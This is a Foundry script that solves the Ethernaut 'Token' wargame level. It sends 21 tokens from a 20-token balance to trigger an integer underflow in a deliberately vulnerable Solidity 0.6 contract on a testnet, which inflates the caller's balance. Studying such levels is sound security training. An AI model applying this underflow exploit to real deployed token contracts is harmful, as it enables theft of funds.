// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Token} from "../src/Token.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Token.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

contract TokenSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("TOKEN_INSTANCE"));
    address public myAddress = vm.envAddress("MY_ADDRESS");
    
    // call the transfer to a random address with more than 20 tokens
    Token tokenInstance = Token(instance);

    function run() external {
        // call the transfer function to a random address with more than 20 tokens
        address randomAddress = 0x10dFe83eb2Fd6885755224A1d3d929FA5Da8F446;
        uint256 value = 21;
        vm.startBroadcast(deployerPrivateKey);
        tokenInstance.transfer(randomAddress, value);
        console.log("My balance: ", tokenInstance.balanceOf(address(myAddress)));
        vm.stopBroadcast();
    }

}